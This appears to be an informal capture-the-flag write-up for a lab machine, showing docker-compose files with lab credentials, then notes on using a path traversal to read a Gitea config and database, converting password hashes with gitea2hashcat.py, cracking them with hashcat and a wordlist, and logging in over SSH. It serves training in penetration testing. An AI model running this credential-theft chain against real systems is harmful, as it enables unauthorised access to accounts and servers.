

esto es un test
````
{"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}



version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always



version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always


````

![Pasted image 20250221112231.png](../../assets/Pasted%20image%2020250221112231.png)
so de structure is `/home/developer/gitea/data/gitea/<datos>` and the defatul gitea confing file is in `conf/app.ini` so lets check it, (because we have a path travertal vector)
![Pasted image 20250221113624.png](../../assets/Pasted%20image%2020250221113624.png)
![Pasted image 20250221113815.png](../../assets/Pasted%20image%2020250221113815.png)
nice now we can preform a crack attack

````txt
cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
53c5801d185db951883293b773a1290b5f0b739198d1347ce8604b036eab8cc61bacb713d33e9aad0a7fa53b762c678783d8
3d96983dad27f6189367d8810bb26221a247414df3a5b011b4251a04d23e0b5df495851487376f34e16e7cfae255b56d36e5
````

but we have to change the structure of the hash (https://exploit-notes.hdks.org/exploit/cryptography/key-derivation-function/pbkdf2/) we can use this tool to comberte the hash

````bash
python3 gitea2hashcat.py ../_home_developer_gitea_data_gitea_gitea.db
````

![Pasted image 20250221120029.png](../../assets/Pasted%20image%2020250221120029.png)

now we can use hashcat

````bash
hashcat --username giteaHashes /usr/share/wordlists/rockyou.txt
````

![Pasted image 20250221133550.png](../../assets/Pasted%20image%2020250221133550.png)

* perfect lets try it in a ssh connection\]

````bash
ssh developer@10.10.11.55
````

![Pasted image 20250221133843.png](../../assets/Pasted%20image%2020250221133843.png)
